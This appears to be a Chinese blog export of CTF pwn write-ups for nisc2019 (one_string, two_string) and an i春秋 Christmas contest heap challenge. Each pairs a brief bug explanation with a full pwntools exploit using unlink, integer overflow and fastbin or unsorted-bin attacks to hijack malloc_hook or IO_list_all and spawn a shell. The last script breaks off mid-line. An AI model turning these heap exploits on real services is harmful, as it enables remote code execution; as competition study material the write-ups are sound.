<h2 id="one-string"><a href="#one-string" class="headerlink" title="one_string"></a>one_string</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序是静态编译的，Edit里会用Strlen修改对应的size，下次Edit根据这个size编辑，因此可以分配0x28之类的chunk，strlen的时候连上size即可覆写后面的size，可以unlink，可以fastbin attack，最终修改0x0804ea4d8的malloc_hook为shell_code_addr(在bss里)我这里用的Unlink，本地通了就没调了</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span></span><br><span class="line">    <span class="comment">#libc = ELF('./x86_libc.so.6')</span></span><br><span class="line">    p = remote(<span class="string">'df0a72047d6c.gamectf.com'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(interval=<span class="number">0.3</span>)</span>:</span></span><br><span class="line">    time.sleep(interval)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    wait()</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,new_content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    wait(<span class="number">0.1</span>)</span><br><span class="line">    p.send(new_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">        p.recvuntil(<span class="string">'Please input you token:\n'</span>)</span><br><span class="line">        p.sendline(<span class="string">'icq16d3378b212336b61cfd024813f31'</span>)</span><br><span class="line">    wait()</span><br><span class="line">    <span class="comment">#p.recvuntil('You know all, Please input:')</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    fd = <span class="number">0x080eba00</span> + <span class="number">4</span>*<span class="number">19</span> - <span class="number">0xc</span></span><br><span class="line">    bk = <span class="number">0x080eba00</span> + <span class="number">4</span>*<span class="number">19</span> - <span class="number">0x8</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">4</span>+p32(<span class="number">0x10</span>)+p32(fd)+p32(bk)</span><br><span class="line">    Malloc(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'\n'</span>)<span class="comment">#0</span></span><br><span class="line">    Malloc(<span class="number">0x14</span>,<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'\n'</span>)<span class="comment">#1</span></span><br><span class="line">    Malloc(<span class="number">0x14</span>,<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'\n'</span>)<span class="comment">#2</span></span><br><span class="line">    Malloc(<span class="number">0x14</span>,<span class="string">'a'</span>*<span class="number">0x14</span>)<span class="comment">#3</span></span><br><span class="line">    Malloc(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'\n'</span>)<span class="comment">#4</span></span><br><span class="line">    Malloc(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">4</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    wait(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    Edit(<span class="number">3</span>,<span class="string">'b'</span>*<span class="number">0x14</span>)</span><br><span class="line">    Edit(<span class="number">3</span>,payload+p32(<span class="number">0x10</span>)+<span class="string">'\x48'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Free(<span class="number">4</span>)</span><br><span class="line">    malloc_hook = <span class="number">0x80EA4D8</span></span><br><span class="line">    bss_base = elf.bss()</span><br><span class="line">    Edit(<span class="number">3</span>,p32(bss_base)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline()</span><br><span class="line">    Edit(<span class="number">0</span>,asm(shellcraft.i386.linux.sh())+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">3</span>,p32(malloc_hook))</span><br><span class="line">    p.sendline()</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0</span>,p32(bss_base)+<span class="string">'\n'</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b* 0x08048b46'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(<span class="string">'40'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="two-string"><a href="#two-string" class="headerlink" title="two_string"></a>two_string</h2><h2 id="程序逻辑-amp-漏洞利用"><a href="#程序逻辑-amp-漏洞利用" class="headerlink" title="程序逻辑&amp;漏洞利用"></a>程序逻辑&amp;漏洞利用</h2><p>可以Create Display Delete，其中Delete之后没有清空chunk内容，可以malloc(0)避免写入，从而泄露堆地址和libc地址。<br>Merge strings里的total_size是4字节的，而计算它的时候没有对其进行检查，从而可以构造0x100000068之类的total_size来分配0x68的chunk，大部分时间都花在找size了。。，最终的total_size由x*8+y+z构成，x是一个较大的数，y为0x100，z为我们要分配的chunk大小，最终z为0x400，使得可以覆写chunk后面那个0x10的块的size，造成overlap chunk，最终Fastbin attack可以修改malloc_hook</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Merges</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> free_index; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> total_size; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> isOverSize; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> new_index; <span class="comment">// [rsp+24h] [rbp-3Ch]</span></span><br><span class="line">  _BYTE *ptr; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> index_arr[<span class="number">10</span>]; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter a sequence of strings to be merged : "</span>);</span><br><span class="line">  size = <span class="number">0x400</span>;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Malloc error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;index_arr[i]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)getchar() == <span class="string">'\n'</span> || i == <span class="number">9</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Merge completed!"</span>);</span><br><span class="line">LABEL_38:</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v11;</span><br><span class="line">  &#125;</span><br><span class="line">  total_size = <span class="number">0</span>;</span><br><span class="line">  isOverSize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= i; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( index_arr[j] &lt; <span class="number">0</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)index_arr[j] &gt; <span class="number">0x1F</span> || !qword_202040[index_arr[j]] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Some error!"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( total_size &gt; <span class="number">0x400</span> &amp;&amp; !isOverSize )</span><br><span class="line">      isOverSize = <span class="number">1</span>;</span><br><span class="line">    total_size += qword_202040[index_arr[j]][<span class="number">1</span>];<span class="comment">// overflow</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( isOverSize )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">realloc</span>(ptr, total_size);</span><br><span class="line">    <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Malloc error!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    size = total_size;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( free_index = <span class="number">0</span>; free_index &lt;= <span class="number">0x1F</span> &amp;&amp; qword_202040[free_index]; ++free_index )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( free_index == <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full! you can't apply for more."</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  &#125;</span><br><span class="line">  new_index = free_index;</span><br><span class="line">  *ptr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= i; ++k )</span><br><span class="line">    <span class="built_in">strcat</span>(ptr, (<span class="keyword">const</span> <span class="keyword">char</span> *)*qword_202040[index_arr[k]]);<span class="comment">// ?</span></span><br><span class="line">  qword_202040[new_index] = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_202040[new_index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Malloc error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *qword_202040[new_index] = ptr;</span><br><span class="line">  qword_202040[new_index][<span class="number">1</span>] = size;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"String creation success! Index is : %d\n"</span>, new_index);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">    gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    <span class="comment">#p = remote('a32f094e35d7.gamectf.com',20001)</span></span><br><span class="line">    p = process(<span class="string">'./pwn'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">    libc_offset = (<span class="number">0x7f1189befb00</span><span class="number">-0x7f118982e000</span>)</span><br><span class="line">    gadgets = [<span class="number">0x45556</span>,<span class="number">0x455aa</span>,<span class="number">0xf1691</span>,<span class="number">0xf2519</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'a32f094e35d7.gamectf.com'</span>,<span class="number">20001</span>)</span><br><span class="line">    libc_offset = (<span class="number">0x7f1189befb00</span><span class="number">-0x7f118982e000</span>)</span><br><span class="line">    gadgets = [<span class="number">0x45556</span>,<span class="number">0x455aa</span>,<span class="number">0xf1691</span>,<span class="number">0xf2519</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please enter the size of string : "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Please enter the string : "</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Display</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input index : "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input index : "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Merge</span><span class="params">(first_index,second_index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please enter the first string index : '</span>)</span><br><span class="line">    p.sendline(str(first_index))</span><br><span class="line">    p.recvuntil(<span class="string">'Please enter the second string index : '</span>)</span><br><span class="line">    p.sendline(str(second_index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Merges</span><span class="params">(index_lis)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please enter a sequence of strings to be merged : '</span>)</span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> index_lis:</span><br><span class="line">        payload += str(item)+<span class="string">" "</span></span><br><span class="line">    payload = payload[:<span class="number">-1</span>]</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Create(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">    Create(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">    Create(<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">    Create(<span class="number">0xfff</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please enter the size of string : "</span>)</span><br><span class="line">    p.sendline(<span class="string">"0"</span>)<span class="comment">#0</span></span><br><span class="line">    Display(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Notes are : '</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x40</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Create(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please enter the size of string : "</span>)</span><br><span class="line">    p.sendline(<span class="string">"0"</span>)<span class="comment">#2</span></span><br><span class="line">    Display(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Notes are : '</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x80</span> - libc_offset</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">    fake_chunk = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">3</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    <span class="comment">#test</span></span><br><span class="line">    Create(<span class="number">0xd0</span>,<span class="string">''</span>)<span class="comment">#4</span></span><br><span class="line">    Create(<span class="number">0x1a</span>,<span class="string">''</span>)<span class="comment">#5</span></span><br><span class="line">    Merges([<span class="number">4</span>]*<span class="number">8</span>)<span class="comment">#6 0x680</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Merges([<span class="number">6</span>]*<span class="number">8</span>)<span class="comment">#7 0x3400</span></span><br><span class="line">    Merges([<span class="number">7</span>]*<span class="number">8</span>+[<span class="number">5</span>])<span class="comment">#8 0x1a01a</span></span><br><span class="line">    Merges([<span class="number">8</span>]*<span class="number">7</span>)<span class="comment">#9 0xb60b6</span></span><br><span class="line"></span><br><span class="line">    Merges([<span class="number">9</span>]*<span class="number">9</span>)<span class="comment">#10 0x666666</span></span><br><span class="line">    Merges([<span class="number">10</span>]*<span class="number">8</span>)<span class="comment">#11 0x3333330</span></span><br><span class="line">    Merges([<span class="number">11</span>]*<span class="number">2</span>)<span class="comment">#12 0x6666660</span></span><br><span class="line"></span><br><span class="line">    Merges([<span class="number">11</span>]*<span class="number">8</span>+[<span class="number">12</span>])<span class="comment">#13 0x1fffffe0</span></span><br><span class="line"></span><br><span class="line">    Create(<span class="number">0x100</span>,<span class="string">'a'</span>*<span class="number">9</span>+<span class="string">'\x21\x01'</span>)<span class="comment">#14</span></span><br><span class="line">    Create(<span class="number">0x400</span>,<span class="string">'a'</span>*<span class="number">0x3ff</span>)<span class="comment">#15</span></span><br><span class="line">    Create(<span class="number">0x10</span>,<span class="string">'a'</span>)<span class="comment">#16</span></span><br><span class="line">    Create(<span class="number">0x400</span>,<span class="string">'a'</span>)<span class="comment">#17</span></span><br><span class="line">    Create(<span class="number">0x68</span>,<span class="string">''</span>)<span class="comment">#18</span></span><br><span class="line">    Create(<span class="number">0x68</span>,<span class="string">''</span>)<span class="comment">#19</span></span><br><span class="line">    Create(<span class="number">0x68</span>,<span class="string">''</span>)<span class="comment">#20</span></span><br><span class="line">    Create(<span class="number">0x10</span>,<span class="string">''</span>)<span class="comment">#21</span></span><br><span class="line">    Create(<span class="number">0x68</span>,<span class="string">''</span>)<span class="comment">#22</span></span><br><span class="line">    Delete(<span class="number">16</span>)</span><br><span class="line">    Delete(<span class="number">17</span>)</span><br><span class="line">    Create(<span class="number">0x10</span>,<span class="string">'a'</span>)<span class="comment">#16</span></span><br><span class="line"></span><br><span class="line">    Merges([<span class="number">13</span>]*<span class="number">8</span>+[<span class="number">15</span>]+[<span class="number">14</span>])<span class="comment">#17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">16</span>)</span><br><span class="line">    Delete(<span class="number">18</span>)</span><br><span class="line">    Create(<span class="number">0xa0</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(fake_chunk))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Create(<span class="number">0x68</span>,<span class="string">'a'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    Create(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(shell_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#flag&#123;458a6246278b42eef7f6a2f36cb4f830&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>第二道题的那个4字节的地方我看到了，结果没反应过来就过去了，最终洞都没找到，很僵硬- -，找洞真的好难。<br>比赛用的是libc 2.24，找这个花了很久，看另一个师傅的wp学到了pwntools给的方法<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">libcdb.search_by_md5(<span class="string">'cfcef452ef69ea2dd73d6f55d7607c2b'</span>)</span><br></pre></td></tr></table></figure></p>
<p>realloc这个好像不太一样，最后那部分构造chunk花了好久，得找个时间总结一下。</p>
]]></content>
      <categories>
        <category>nisc2019</category>
      </categories>
  </entry>
  <entry>
    <title>i春秋网络内生安全实验场圣诞赛</title>
    <url>/2020/09/03/nest/</url>
    <content><![CDATA[<h1 id="i春秋网络内生安全实验场圣诞赛"><a href="#i春秋网络内生安全实验场圣诞赛" class="headerlink" title="i春秋网络内生安全实验场圣诞赛"></a>i春秋网络内生安全实验场圣诞赛</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复习无聊，间隙做了这个小比赛的几个题，pwn整体难度不高，很友好。</p>
<h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>看雪CTFQ3的原题，有off-by-one。libc为2.23。malloc_hook自己加了一个hook函数，所以改hook没用，这里ub攻击IO_list_all，用0x60的small bin伪造文件结构体get shell。(看群里有WM的师傅可能出题人是同一个)</p>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./heap'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./heap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'120.55.43.255'</span>,<span class="number">12240</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,data=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"data: "</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which heap do you want to delete: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0xd0</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x1f8</span>,p64(<span class="number">0x21</span>)*<span class="number">50</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x28</span>)<span class="comment">#3</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Show()</span><br><span class="line">    p.recvuntil(<span class="string">"0 : aaaaaaaa"</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span>- <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0xd0</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get heap</span></span><br><span class="line">    <span class="comment">#vtable</span></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+<span class="string">'\xf1'</span>)<span class="comment">#4 overwrite 1</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span 